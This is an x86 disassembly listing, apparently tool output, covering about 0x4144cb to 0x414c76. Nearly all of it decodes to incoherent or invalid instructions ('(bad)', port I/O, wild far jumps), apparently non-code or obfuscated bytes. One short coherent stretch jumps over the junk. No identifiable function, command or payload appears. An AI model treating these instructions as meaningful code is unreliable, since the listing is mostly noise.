  4144cb:	or     al,0x5e
  4144cd:	push   edi
  4144ce:	je     0x41445e
  4144d0:	imul   edx,DWORD PTR [edx-0x3ec1cb74],0x18
  4144d7:	(bad)  
  4144d9:	mov    DWORD PTR [ebp-0x13],ebp
  4144dc:	pushf  
  4144dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144de:	push   edx
  4144df:	inc    eax
  4144e0:	neg    DWORD PTR [ebx-0x52]
  4144e3:	ja     0x4144d9
  4144e5:	lahf   
  4144e6:	hlt    
  4144e7:	cmp    BYTE PTR [edi+0x6e],bh
  4144ea:	mov    ds:0xb95182d5,al
  4144ef:	leave  
  4144f0:	das    
  4144f1:	push   ecx
  4144f2:	add    ecx,DWORD PTR [ecx]
  4144f4:	inc    edi
  4144f5:	dec    ebp
  4144f6:	inc    edx
  4144f7:	push   ecx
  4144f8:	mov    dl,BYTE PTR [esi]
  4144fa:	shr    DWORD PTR [esp+esi*1-0x35637b42],1
  414501:	add    eax,0x7baf4c00
  414506:	dec    ebx
  414507:	xchg   ebp,eax
  414508:	dec    ebp
  414509:	iret   
  41450a:	loopne 0x4144bb
  41450c:	xor    al,0xe4
  41450e:	xor    DWORD PTR [ecx],ecx
  414510:	sbb    eax,edx
  414512:	int3   
  414513:	sti    
  414514:	push   eax
  414515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414516:	sub    DWORD PTR ds:0xbd7ded89,edi
  41451c:	inc    esp
  41451d:	enter  0xadcc,0x81
  414521:	cdq    
  414522:	mov    ch,0x81
  414524:	fwait
  414525:	xchg   DWORD PTR [ebx-0x2322e3b3],ecx
  41452b:	push   ebp
  41452c:	xchg   esi,eax
  41452d:	xor    DWORD PTR [ecx-0x14aba100],esi
  414533:	cmp    DWORD PTR [ecx+ebp*2+0x46af001e],ecx
  41453a:	nop
  41453b:	adc    bh,dl
  41453d:	adc    al,0xc2
  41453f:	mov    cs,WORD PTR [esi]
  414541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414542:	jmp    0x40d6a852
  414547:	xchg   ebp,eax
  414548:	xchg   ebp,eax
  414549:	sub    al,0xf0
  41454b:	inc    esp
  41454c:	add    eax,0xb2469437
  414551:	xor    al,0x93
  414553:	sub    BYTE PTR [edx+0x20],0xd5
  414557:	lahf   
  414558:	adc    ecx,DWORD PTR [ecx-0x6a222f95]
  41455e:	ret    0x90f1
  414561:	sbb    al,0xdc
  414563:	jge    0x414563
  414565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414566:	xchg   ebp,eax
  414567:	sub    esi,DWORD PTR [edi-0x2239082e]
  41456d:	(bad)  
  41456e:	in     eax,dx
  41456f:	mov    ebp,0x7f4f6a5a
  414574:	mov    cl,0x13
  414576:	clc    
  414577:	and    DWORD PTR [esi],0x46
  41457a:	fsubr  DWORD PTR [esi+eiz*2-0xf]
  41457e:	ja     0x4145de
  414580:	mov    dl,0xd7
  414582:	mov    bl,0xc3
  414584:	push   ecx
  414585:	jmp    0x92fb3a71
  41458a:	sbb    DWORD PTR [ebx-0x50],esi
  41458d:	mov    ebp,0x30b906ad
  414592:	mov    WORD PTR [edi],?
  414594:	mov    ch,0x33
  414596:	cli    
  414597:	sbb    BYTE PTR [ebx-0x2fbbe2f7],al
  41459d:	out    0x77,al
  41459f:	sbb    al,0xc5
  4145a1:	inc    edi
  4145a2:	cmp    cl,dh
  4145a4:	test   BYTE PTR [edx-0x18d1b90e],cl
  4145aa:	jbe    0x414570
  4145ac:	sbb    al,0xbe
  4145ae:	fcom   QWORD PTR [ebx-0x2b822c6b]
  4145b4:	(bad)  
  4145b5:	shl    DWORD PTR [eax+0x21],1
  4145b8:	adc    al,0x8a
  4145ba:	xchg   ebx,eax
  4145bb:	dec    edx
  4145bc:	mov    esi,0x65c98105
  4145c1:	sbb    edx,DWORD PTR [ebx+0x7b]
  4145c4:	daa    
  4145c5:	les    esp,FWORD PTR [ecx-0x6d55afe]
  4145cb:	jge    0x414631
  4145cd:	add    DWORD PTR [esi],ebx
  4145cf:	in     eax,0xb0
  4145d1:	stos   DWORD PTR es:[edi],eax
  4145d2:	cwde   
  4145d3:	push   ebp
  4145d4:	sahf   
  4145d5:	xor    cl,bl
  4145d7:	pop    ebx
  4145d8:	jno    0x414567
  4145da:	and    BYTE PTR [ecx-0x4],ah
  4145dd:	ins    DWORD PTR es:[edi],dx
  4145de:	icebp  
  4145df:	sti    
  4145e0:	mov    al,ds:0xe8616e6d
  4145e5:	or     DWORD PTR [esi+0x2a],ebx
  4145e8:	push   0xffffffb1
  4145ea:	xor    DWORD PTR [eax-0x58],0xffffff80
  4145ee:	jo     0x4145cc
  4145f0:	adc    BYTE PTR [edx],dl
  4145f2:	mov    eax,ds:0xe89940e0
  4145f7:	xchg   ch,bl
  4145f9:	repnz xchg ebp,eax
  4145fb:	mov    al,BYTE PTR [ebp-0x2ea2cdf6]
  414601:	xchg   ecx,eax
  414602:	mov    ds:0x72b628b5,eax
  414607:	cmp    al,0x3f
  414609:	add    ebp,0x75
  41460c:	push   esi
  41460d:	arpl   WORD PTR [edx+0x7d],sp
  414610:	mov    dh,0x5c
  414612:	das    
  414613:	inc    edi
  414614:	lds    ecx,FWORD PTR ds:0x71fd99c4
  41461a:	inc    esp
  41461b:	arpl   WORD PTR [esi+0xee0f0f5],di
  414621:	repz inc ecx
  414623:	cli    
  414624:	retf   0x680e
  414627:	lds    esi,FWORD PTR [ebp+0x70]
  41462a:	sub    ch,BYTE PTR [esp+ebx*1+0x6f]
  41462e:	leave  
  41462f:	ss mov esp,0x32dffce1
  414635:	mov    ecx,0x5ddb2396
  41463a:	push   esi
  41463b:	jns    0x4146b3
  41463d:	pusha  
  41463e:	pop    ecx
  41463f:	stos   BYTE PTR es:[edi],al
  414640:	stc    
  414641:	xor    bh,BYTE PTR [esi]
  414643:	fwait
  414644:	jnp    0x414654
  414646:	inc    eax
  414648:	fld    DWORD PTR [esi-0x4d33893f]
  41464e:	into   
  41464f:	mov    ebp,0x58b998f3
  414654:	and    cl,al
  414656:	lods   eax,DWORD PTR ds:[esi]
  414657:	push   esi
  414658:	mov    al,0x90
  41465a:	dec    ebp
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	add    BYTE PTR [edx],0x1
  414674:	(bad)
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x414697
  41467f:	pop    edx
  414680:	xchg   DWORD PTR [esi],esi
  414682:	push   0x3997dfec
  414687:	popf   
  414688:	xor    DWORD PTR [edx],ebx
  41468a:	cmp    ecx,DWORD PTR [esi-0x5f7aa6cd]
  414690:	push   ss
  414691:	hlt    
  414692:	mov    esp,0x98eda62d
  414697:	mov    esp,0x7616c2f5
  41469c:	fsubr  st(5),st
  41469e:	sbb    eax,0x36249d52
  4146a3:	xor    eax,0x3eabe860
  4146a8:	loop   0x41466e
  4146aa:	dec    esi
  4146ab:	test   ebx,esi
  4146ad:	inc    ebp
  4146ae:	int3   
  4146af:	dec    ecx
  4146b0:	test   DWORD PTR [ecx],ebp
  4146b2:	psadbw mm5,QWORD PTR [ecx]
  4146b5:	(bad)  
  4146b6:	call   0xba9e:0xa5b536a
  4146bd:	lods   eax,DWORD PTR ds:[esi]
  4146be:	pop    esp
  4146bf:	fcmovnbe st,st(6)
  4146c1:	into   
  4146c2:	inc    esi
  4146c3:	jmp    0x8ff7:0xc4cd5d15
  4146ca:	ds ins BYTE PTR es:[edi],dx
  4146cc:	out    0x72,al
  4146ce:	jmp    0x414665
  4146d0:	fadd   st(7),st
  4146d2:	test   eax,0x338a4eb3
  4146d7:	sub    eax,0x476c3d9e
  4146dc:	cmp    al,0x42
  4146de:	jae    0x41470f
  4146e0:	jg     0x4146bd
  4146e2:	in     eax,0xbb
  4146e4:	pop    es
  4146e5:	pusha  
  4146e6:	jno    0x41472a
  4146e8:	jp     0x4146ca
  4146ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146eb:	mov    BYTE PTR [edi],ch
  4146ed:	jg     0x41467b
  4146ef:	(bad)  
  4146f0:	fdivr  DWORD PTR [ebx]
  4146f2:	cmp    al,0xfe
  4146f4:	xchg   edx,eax
  4146f5:	mov    ds:0xf3b541d5,al
  4146fa:	iret   
  4146fb:	or     esi,edi
  4146fd:	sbb    dh,BYTE PTR [ebx+0xd]
  414700:	lock mov cl,0x9e
  414703:	cs jp  0x414771
  414706:	stos   DWORD PTR es:[edi],eax
  414707:	xchg   ecx,eax
  414708:	sub    al,0x2f
  41470a:	mov    ebx,0xe7ea83c9
  41470f:	ret    
  414710:	rol    eax,cl
  414712:	jno    0x41472b
  414714:	jp     0x4146e9
  414716:	and    eax,0xef5c9026
  41471b:	or     bh,BYTE PTR [edx+edi*1+0x22]
  41471f:	or     eax,0x2235748b
  414724:	xchg   edi,eax
  414725:	gs ja  0x4146a8
  414728:	sub    esp,edx
  41472a:	push   eax
  41472b:	mov    BYTE PTR [edx+esi*8+0x3f],ch
  41472f:	stc    
  414730:	cmp    eax,0x9c917478
  414735:	lods   al,BYTE PTR ds:[esi]
  414736:	xchg   edx,eax
  414737:	cmp    DWORD PTR [eax],edi
  414739:	add    dl,al
  41473b:	inc    esp
  41473c:	and    al,0x41
  41473e:	out    0xfc,al
  414740:	and    BYTE PTR [esi],dl
  414742:	dec    eax
  414743:	add    BYTE PTR [ebx-0x5066dfb5],cl
  414749:	jae    0x414786
  41474b:	sub    ebp,DWORD PTR [edi-0x35]
  41474e:	dec    ebx
  41474f:	xor    eax,0x95342067
  414754:	pop    ss
  414755:	hlt    
  414756:	fidivr WORD PTR [ebx+ebp*2]
  414759:	rol    DWORD PTR [ecx],cl
  41475b:	rol    DWORD PTR [eax-0x7713713e],1
  414761:	retf   0x587b
  414764:	push   esi
  414765:	dec    ebx
  414766:	add    dl,bh
  414768:	cmp    eax,0x962b01f4
  41476d:	inc    eax
  41476e:	scas   eax,DWORD PTR es:[edi]
  41476f:	(bad)  
  414770:	cli    
  414771:	xor    cl,BYTE PTR [ebx-0x71b68ec3]
  414777:	shl    BYTE PTR [esi+0x30],1
  41477a:	and    DWORD PTR [edi+0x4e783d57],esp
  414780:	out    0xee,al
  414782:	out    dx,al
  414783:	or     ah,BYTE PTR [ebx-0x55]
  414786:	xchg   edx,eax
  414787:	stos   BYTE PTR es:[edi],al
  414788:	clc    
  414789:	je     0x414789
  41478b:	inc    esi
  41478c:	scas   eax,DWORD PTR es:[edi]
  41478d:	pop    ds
  41478e:	jl     0x4147f1
  414790:	popa   
  414791:	daa    
  414792:	mov    eax,0xac0012a
  414797:	pop    ebp
  414798:	xchg   ecx,eax
  414799:	cli    
  41479a:	xor    ecx,DWORD PTR [ecx+0x725f519f]
  4147a0:	es aad 0x63
  4147a3:	xchg   ebx,eax
  4147a4:	mov    bh,0xb0
  4147a6:	hlt    
  4147a7:	cmp    dh,BYTE PTR [edx]
  4147a9:	ins    DWORD PTR es:[di],dx
  4147ab:	lods   eax,DWORD PTR ds:[esi]
  4147ac:	dec    esi
  4147ad:	js     0x414770
  4147af:	mov    ds:0x8986316b,eax
  4147b4:	stc    
  4147b5:	xchg   ecx,eax
  4147b6:	cmp    al,0x8e
  4147b8:	xchg   ecx,eax
  4147b9:	dec    esp
  4147ba:	fdiv   QWORD PTR [ecx+0x5d]
  4147bd:	dec    edi
  4147be:	pop    ss
  4147bf:	ret    0xc557
  4147c2:	cmp    eax,0x840deb90
  4147c7:	add    edi,esp
  4147c9:	pop    eax
  4147ca:	inc    esp
  4147cb:	jl     0x414812
  4147cd:	xchg   bl,al
  4147cf:	push   ebx
  4147d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d1:	mov    ds:0x8d019abd,eax
  4147d6:	cmp    al,BYTE PTR [eax]
  4147d8:	orps   xmm7,XMMWORD PTR [esp+eax*2]
  4147dc:	pop    ds
  4147dd:	in     eax,dx
  4147de:	inc    esi
  4147df:	mov    eax,0x2d48dc3f
  4147e4:	(bad)  
  4147e5:	pop    edx
  4147e6:	repz inc edx
  4147e8:	nop
  4147e9:	inc    ebp
  4147ea:	adc    esp,edx
  4147ec:	lods   al,BYTE PTR ds:[esi]
  4147ed:	xor    al,bh
  4147ef:	popw   es
  4147f1:	jmp    0x414860
  4147f3:	mov    bl,al
  4147f5:	int3   
  4147f6:	out    dx,al
  4147f7:	das    
  4147f8:	outs   dx,DWORD PTR ds:[esi]
  4147f9:	xchg   esp,eax
  4147fa:	mov    ds:0x6fac3b1,eax
  4147ff:	inc    ecx
  414800:	mov    dl,0x72
  414802:	adc    DWORD PTR [esi-0x5d],ebx
  414805:	pop    eax
  414806:	gs pop edi
  414808:	shl    BYTE PTR [ebx+0x31],1
  41480b:	lods   eax,DWORD PTR ds:[esi]
  41480c:	cmp    ebx,DWORD PTR [edi+0x6c]
  41480f:	ss mov ecx,0x4a115749
  414815:	(bad)  
  414816:	cmp    BYTE PTR [edx+0x4b],al
  414819:	(bad)  
  41481a:	cmc    
  41481b:	cdq    
  41481c:	push   edx
  41481d:	and    al,0x96
  41481f:	inc    edi
  414820:	push   0xc
  414822:	je     0x414851
  414824:	push   0xaf6993c6
  414829:	call   0x4c63c250
  41482e:	test   al,0x2d
  414830:	shl    DWORD PTR [esp+ebp*8+0xe5612dd],cl
  414837:	ror    BYTE PTR [edi+0x7cbf417c],1
  41483d:	mov    ds:0x25836c71,eax
  414842:	ds jg  0x4148b5
  414845:	test   al,0xc4
  414847:	ds jo  0x4147cf
  41484a:	mov    DWORD PTR [ecx-0x59],edx
  41484d:	loope  0x414856
  41484f:	dec    bp
  414851:	cmp    al,0x4e
  414853:	aam    0xf2
  414855:	neg    DWORD PTR [esi]
  414857:	push   0xb221d4a
  41485c:	dec    DWORD PTR [ecx]
  41485e:	in     al,dx
  41485f:	mov    dh,0xc8
  414861:	fst    QWORD PTR [esi-0x5d5f4650]
  414867:	inc    eax
  414868:	stos   DWORD PTR es:[edi],eax
  414869:	test   eax,0x10b10ee
  41486e:	pop    esp
  41486f:	in     eax,dx
  414870:	mov    ds:0x3b2aa39a,al
  414875:	add    esi,DWORD PTR [ecx-0x5596d289]
  41487b:	or     DWORD PTR ds:0x1db183a9,ebx
  414881:	xchg   ebx,eax
  414882:	(bad)  
  414883:	mov    bl,0xea
  414885:	push   es
  414886:	ds sbb eax,0xda589bb4
  41488c:	pop    ebx
  41488d:	sbb    dl,BYTE PTR [esi-0x4f]
  414890:	pop    ebx
  414891:	aam    0xf2
  414893:	adc    DWORD PTR [edi+0x5b],esp
  414896:	mov    esp,0x8d089730
  41489b:	imul   ebp,eax,0x194f2887
  4148a1:	pop    eax
  4148a2:	add    BYTE PTR [esi+eax*1-0x78d2946f],dl
  4148a9:	xchg   edi,eax
  4148aa:	js     0x4148a3
  4148ac:	ret    
  4148ad:	inc    esi
  4148ae:	mov    dh,BYTE PTR [ecx]
  4148b0:	inc    edx
  4148b1:	std    
  4148b2:	sub    al,0xdb
  4148b4:	and    BYTE PTR [ebx+0x2b],dl
  4148b7:	mov    edx,0x7a61225f
  4148bc:	adc    DWORD PTR [ebp-0x42],ebp
  4148bf:	xlat   BYTE PTR ds:[ebx]
  4148c0:	lock mov edx,0x94f0f9f5
  4148c6:	scas   al,BYTE PTR es:[edi]
  4148c7:	jae    0x4148f8
  4148c9:	push   sp
  4148cb:	ret    0xfca4
  4148ce:	mov    esi,0xf8222e9a
  4148d3:	jae    0x4148e4
  4148d5:	mov    ebp,0x9498fd1a
  4148da:	inc    ebx
  4148db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148dc:	dec    edx
  4148dd:	jne    0x414887
  4148df:	adc    bh,BYTE PTR [ecx+edi*2-0x4ae9aa69]
  4148e6:	inc    esp
  4148e7:	pop    ss
  4148e8:	cmp    eax,0xd703f833
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0x3fd87ab5]
  414921:	mov    edx,0xc1b9cb7
  414926:	jg     0x4149a0
  414928:	in     eax,0x7e
  41492a:	js     0x4149a4
  41492c:	(bad)  
  41492d:	mov    WORD PTR [ecx-0x63],fs
  414930:	ud0    ebx,DWORD PTR ds:[edx]
  414934:	adc    al,ah
  414936:	and    ch,BYTE PTR [edi]
  414938:	ret    0x8a7a
  41493b:	aam    0x40
  41493d:	mov    WORD PTR [ecx-0x5daf00db],gs
  414943:	(bad)  [ebx+0x15]
  414946:	outs   dx,DWORD PTR ds:[esi]
  414947:	pop    esp
  414948:	inc    edx
  414949:	xchg   BYTE PTR [esi-0x5399c037],dh
  41494f:	and    DWORD PTR [eax-0x5b],0xfffffff2
  414953:	enter  0x5bf2,0xf2
  414957:	push   0x5f
  414959:	les    ecx,FWORD PTR [ebp-0x27]
  41495c:	xchg   DWORD PTR [esi],edi
  41495e:	inc    edi
  41495f:	jne    0x4149d6
  414961:	sub    al,BYTE PTR [ecx+0x2cc7e2c3]
  414967:	pop    esi
  414968:	push   edx
  414969:	xchg   esp,edx
  41496b:	inc    edx
  41496c:	repz je 0x414989
  41496f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414970:	jle    0x414988
  414972:	call   0x4345:0xe0818a73
  414979:	fcmovnb st,st(5)
  41497b:	repnz aad 0xb5
  41497e:	cli    
  41497f:	mov    esi,0x79cdda67
  414984:	loope  0x414912
  414986:	(bad)  
  414987:	jmp    0x414985
  414989:	push   cs
  41498a:	(bad)  [esi]
  41498c:	add    DWORD PTR [edi],ebp
  41498e:	push   eax
  41498f:	cmp    al,0x47
  414991:	mov    WORD PTR [edx+esi*4+0x36],ds
  414995:	enter  0x9df5,0xec
  414999:	int    0xd4
  41499b:	ds jns 0x4149b6
  41499e:	xchg   DWORD PTR [eax-0x3f],ebx
  4149a1:	out    dx,eax
  4149a2:	inc    ebx
  4149a3:	(bad)  
  4149a4:	pop    ebx
  4149a5:	jg     0x41493e
  4149a7:	jmp    0xa8b8:0x9500d839
  4149ae:	ins    BYTE PTR es:[edi],dx
  4149af:	mov    ebx,0x58579357
  4149b4:	jno    0x414993
  4149b6:	pop    es
  4149b7:	shl    DWORD PTR [esi+esi*1+0x45],0xb8
  4149bc:	push   ecx
  4149bd:	sub    bl,BYTE PTR [eax]
  4149bf:	add    al,0x4c
  4149c1:	jo     0x414a16
  4149c3:	push   eax
  4149c4:	fcmovnu st,st(3)
  4149c6:	xor    eax,0xf661f452
  4149cb:	popf   
  4149cc:	fs mov eax,0x8783e201
  4149d2:	add    eax,0xbb52195d
  4149d7:	cmp    eax,0xf47634a4
  4149dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149dd:	mov    al,ds:0x9b902034
  4149e2:	pop    esp
  4149e3:	xchg   esp,eax
  4149e4:	xchg   ecx,eax
  4149e5:	fs scas al,BYTE PTR es:[edi]
  4149e7:	mov    esi,0x85c3d6d5
  4149ec:	xchg   ecx,eax
  4149ed:	outs   dx,BYTE PTR ds:[esi]
  4149ee:	mov    ebx,0x46e143e6
  4149f3:	inc    ecx
  4149f4:	adc    eax,DWORD PTR [eax-0x3d57609e]
  4149fa:	inc    esi
  4149fb:	dec    esi
  4149fc:	mov    esi,DWORD PTR [edi]
  4149fe:	inc    edx
  4149ff:	pop    esp
  414a00:	add    BYTE PTR [ebp-0xd],bl
  414a03:	cs in  eax,dx
  414a05:	xchg   ecx,eax
  414a06:	sub    cl,ah
  414a08:	scas   al,BYTE PTR es:[edi]
  414a09:	jmp    0x414a3b
  414a0b:	(bad)
  414a0e:	(bad)  
  414a0f:	retf   
  414a10:	fisubr WORD PTR [edi+0x22]
  414a13:	mov    ecx,0x39543986
  414a18:	inc    edi
  414a19:	inc    edx
  414a1a:	jmp    0xfa0816c1
  414a1f:	mov    ds:0x58235edb,al
  414a24:	outs   dx,BYTE PTR ds:[esi]
  414a25:	jle    0x4149b3
  414a27:	aad    0xea
  414a29:	scas   al,BYTE PTR es:[edi]
  414a2a:	mov    esi,0x212051e8
  414a2f:	bound  edi,QWORD PTR [eax]
  414a31:	inc    ecx
  414a32:	sbb    ebp,DWORD PTR [ebp-0x63]
  414a35:	int    0x18
  414a37:	mov    bh,0x10
  414a39:	dec    esp
  414a3a:	ret    0xc1c6
  414a3d:	enter  0x8d6e,0x27
  414a41:	ins    DWORD PTR es:[edi],dx
  414a42:	mov    ah,0xd0
  414a44:	ror    DWORD PTR [ebp-0x50f55e71],0x41
  414a4b:	inc    ebx
  414a4c:	sub    bl,BYTE PTR [ebx]
  414a4e:	xchg   esi,eax
  414a4f:	pop    ecx
  414a50:	mov    eax,DWORD PTR [ebp-0x45]
  414a53:	loop   0x414aa9
  414a55:	xlat   BYTE PTR ds:[ebx]
  414a56:	shl    bh,0x5a
  414a59:	stos   BYTE PTR es:[edi],al
  414a5a:	mov    ?,WORD PTR [ebp+0x6d1adc99]
  414a60:	lods   al,BYTE PTR ds:[esi]
  414a61:	xor    eax,DWORD PTR [edx-0xb]
  414a64:	cmp    DWORD PTR [ebp-0x507c4298],ebx
  414a6a:	mov    ?,WORD PTR [edi+0x1e]
  414a6d:	retf   
  414a6e:	xchg   BYTE PTR [ebx+ebx*8],dh
  414a71:	jne    0x414a5d
  414a73:	push   ebx
  414a74:	sub    eax,edx
  414a76:	inc    edi
  414a77:	int    0x2b
  414a79:	sbb    al,0xf3
  414a7b:	pop    eax
  414a7c:	popa   
  414a7d:	mov    BYTE PTR [edx-0x695b8b8c],dl
  414a83:	daa    
  414a84:	enter  0x38be,0x29
  414a88:	xchg   ebx,eax
  414a89:	les    edi,FWORD PTR [esi+0x41]
  414a8c:	mov    ds:0xe304aef6,eax
  414a91:	adc    edi,DWORD PTR [eax+0x78]
  414a94:	add    DWORD PTR [ebp-0x39bf3f68],edi
  414a9a:	dec    ecx
  414a9b:	adc    dl,cl
  414a9d:	mov    ds:0x95e6ee43,al
  414aa2:	test   dh,ch
  414aa4:	aaa    
  414aa5:	adc    BYTE PTR [eax],ch
  414aa7:	outs   dx,DWORD PTR ds:[esi]
  414aa8:	dec    esp
  414aa9:	and    al,0x6e
  414aab:	loope  0x414a69
  414aad:	sbb    bh,BYTE PTR [ebx+0x3]
  414ab0:	int3   
  414ab1:	or     BYTE PTR [ecx-0x19],bl
  414ab4:	or     DWORD PTR [ecx+0x7a],0x10ec476d
  414abb:	add    eax,0xff7797d7
  414ac0:	xchg   ebx,eax
  414ac1:	dec    esp
  414ac2:	jo     0x414afa
  414ac4:	jmpw   0x304d
  414ac8:	xor    esi,edi
  414aca:	shl    DWORD PTR [ebx],0xf5
  414acd:	sar    BYTE PTR [ebx],0x3
  414ad0:	and    BYTE PTR [ecx],ah
  414ad2:	mov    edx,0x7b3c94cb
  414ad7:	lea    esi,[edx+0xea55f8c]
  414add:	mov    DWORD PTR [esi],ebp
  414adf:	nop
  414ae0:	lock mov WORD PTR [ebx+0xf602ff7],?
  414ae7:	pop    ebx
  414ae8:	add    BYTE PTR [esi+eiz*8-0x2187a425],dh
  414aef:	mov    WORD PTR [ebp+0x71],ss
  414af2:	sbb    ah,BYTE PTR [edx+0x6c581f69]
  414af8:	fwait
  414af9:	sahf   
  414afa:	stos   BYTE PTR es:[edi],al
  414afb:	and    ah,bh
  414afd:	mov    eax,ds:0xe91a8bc7
  414b02:	xchg   ebx,eax
  414b03:	adc    ecx,edx
  414b05:	jmp    0x75eeb044
  414b0a:	out    0xf4,al
  414b0c:	jo     0x414b2a
  414b0e:	pop    es
  414b0f:	jmp    0x6cec:0x19bca375
  414b16:	adc    al,0xdc
  414b18:	sub    edi,eax
  414b1a:	mov    al,ds:0x444e67a6
  414b1f:	imul   esi,DWORD PTR [ebx],0xfffffffd
  414b22:	or     BYTE PTR [edx+eiz*2],ch
  414b25:	outs   dx,DWORD PTR ds:[esi]
  414b26:	pop    esi
  414b27:	outs   dx,DWORD PTR ds:[esi]
  414b28:	inc    ecx
  414b29:	sbb    DWORD PTR [ebx-0x67464ec7],0x4e
  414b30:	sub    BYTE PTR [eax+0x59],0xc6
  414b34:	mov    dl,0x55
  414b36:	je     0x414b7a
  414b38:	mov    WORD PTR [ebx-0x1a],fs
  414b3b:	push   edx
  414b3c:	lahf   
  414b3d:	and    bl,BYTE PTR [eax+0x155ae4ee]
  414b43:	test   WORD PTR [eax-0x60],bp
  414b47:	std    
  414b48:	push   ebp
  414b49:	aam    0xa
  414b4b:	into   
  414b4c:	sbb    esp,edx
  414b4e:	push   ecx
  414b4f:	rcl    DWORD PTR [ebp+0x5ea76b2c],0xbc
  414b56:	mov    cl,0x5
  414b58:	pushf  
  414b59:	adc    DWORD PTR [esp+ebp*4],esi
  414b5c:	cld    
  414b5d:	jo     0x414b71
  414b5f:	cdq    
  414b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b61:	xor    al,bl
  414b63:	mov    dh,0x99
  414b65:	scas   eax,DWORD PTR es:[edi]
  414b66:	imul   eax,DWORD PTR [ebx-0x15c3c1e9],0x71
  414b6d:	data16 data16 mov bl,0x92
  414b71:	mov    esp,0x78f4cca
  414b76:	cmp    ch,BYTE PTR [ebx]
  414b78:	out    0x6d,eax
  414b7a:	fstp   TBYTE PTR [eax-0x3619aadb]
  414b80:	loop   0x414bc7
  414b82:	cli    
  414b83:	cmp    eax,0x7e02976
  414b88:	pop    esp
  414b89:	xchg   ebx,eax
  414b8a:	dec    ebx
  414b8b:	ret    
  414b8c:	push   ax
  414b8e:	cmp    ebx,ecx
  414b90:	ins    DWORD PTR es:[edi],dx
  414b91:	in     al,0x4b
  414b93:	mov    dl,BYTE PTR [ecx+ebp*2+0x3d03373]
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	add    dh,dh
  414bb3:	cmp    BYTE PTR [eax+eax*4-0x1a8780ee],al
  414bba:	jle    0x414c34
  414bbc:	js     0x414bcf
  414bbe:	xor    eax,DWORD PTR [ebx]
  414bc0:	mov    bh,bh
  414bc2:	stos   BYTE PTR es:[edi],al
  414bc3:	xlat   BYTE PTR ds:[ebx]
  414bc4:	or     al,BYTE PTR [eax+0x60]
  414bc7:	mov    ebx,0x747883cc
  414bcc:	xchg   esp,eax
  414bcd:	fnstcw WORD PTR [eax-0x54a00b9d]
  414bd3:	pop    ebx
  414bd4:	push   edx
  414bd5:	xchg   edx,eax
  414bd6:	push   0xe7cbae40
  414bdb:	pop    esi
  414bdc:	or     ebp,DWORD PTR [esi-0x5f027d7]
  414be2:	xlat   BYTE PTR ds:[ebx]
  414be3:	mov    DWORD PTR [di+0x1f24],edx
  414be8:	dec    ecx
  414be9:	pop    edx
  414bea:	jno    0x414c5a
  414bec:	mov    ecx,0x3ae6a840
  414bf1:	jne    0x414c6d
  414bf3:	add    DWORD PTR [ebx],edx
  414bf5:	push   cs
  414bf6:	jno    0x414c0b
  414bf8:	(bad)  
  414bf9:	rol    BYTE PTR [ebx],cl
  414bfb:	mov    ah,0xb1
  414bfd:	mov    eax,0xef57377e
  414c02:	popa   
  414c03:	stc    
  414c04:	imul   edx,ebx,0xc69be4e6
  414c0a:	push   0x980a81ff
  414c0f:	aas    
  414c10:	cmp    BYTE PTR [eax],bh
  414c12:	inc    DWORD PTR [ecx+0x6a33e16c]
  414c18:	lods   eax,DWORD PTR ds:[esi]
  414c19:	sbb    eax,0x9834bcd5
  414c1e:	jmp    0x414c55
  414c20:	neg    DWORD PTR [eax+esi*4-0x31]
  414c24:	out    dx,al
  414c25:	cs jno 0x414c7c
  414c28:	int3   
  414c29:	sub    DWORD PTR [edx-0x69ec813],0xcefa7a7
  414c33:	adc    al,0x98
  414c35:	mov    bh,0x5a
  414c37:	test   eax,0x4a32b752
  414c3c:	push   ebx
  414c3d:	and    al,0xf5
  414c3f:	sub    bl,BYTE PTR [eax+0x21]
  414c42:	outs   dx,DWORD PTR ds:[esi]
  414c43:	rol    sp,0x69
  414c47:	enter  0x5b2b,0x9f
  414c4b:	and    al,0xf4
  414c4d:	mov    bh,0x7b
  414c4f:	repnz and bl,dl
  414c52:	add    DWORD PTR [edx+0x18d794c4],esp
  414c58:	(bad)  
  414c59:	pop    edi
  414c5a:	rol    DWORD PTR [edx],0xf5
  414c5d:	retf   
  414c5e:	(bad)  
  414c5f:	cmp    eax,0xf085d665
  414c64:	enter  0xe27,0xaa
  414c68:	cs shr esi,1
  414c6b:	(bad)  
  414c6c:	cmp    DWORD PTR [eax-0x40],ebp
  414c6f:	dec    edi
  414c70:	mov    ds:0xe925862f,eax
  414c75:	nop
  414c76:	scas   eax,DWORD PTR es:[edi]
